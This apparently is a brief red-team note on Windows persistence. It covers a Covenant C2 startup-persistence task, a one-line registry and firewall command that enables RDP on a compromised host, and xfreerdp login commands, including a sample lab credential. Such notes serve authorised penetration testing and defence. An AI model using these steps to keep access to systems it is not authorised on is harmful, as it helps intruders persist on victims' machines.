# windows - persistence

## covenant

A grunt with High integrity > Task > PersistStartup

## RDP

on Covenant, enable RDP and add a firewall rule to allow RDP

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

If you want to disable:

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

on Kali:

```bash
$ xfreerdp /u:<username> /p:<password> /v:<ip-address>
```

```bash
$ xfreerdp /u:s.chisholm /p:'FallOutBoy1!' /v:192.168.3.4
```



